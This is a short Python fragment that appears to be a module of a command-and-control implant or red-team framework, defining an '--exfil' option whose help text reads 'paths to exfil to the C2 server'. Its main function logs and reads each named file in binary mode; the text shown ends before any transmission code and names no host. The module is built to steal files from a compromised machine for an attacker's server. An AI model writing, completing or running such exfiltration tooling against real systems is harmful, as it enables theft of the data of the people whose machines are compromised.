args = ["-e", "--exfil"]
kwargs = {"metavar": "path", "nargs": "+", "help": "paths to exfil to the C2 server"}


def main(args, env):
    l = env["LOGGER"]
    exfil_paths = args
    for path in exfil_paths:
        l.info(f"{__name__}: exfiltrating {path}...")
        with open(path, "rb") as f:
            data = f.read()
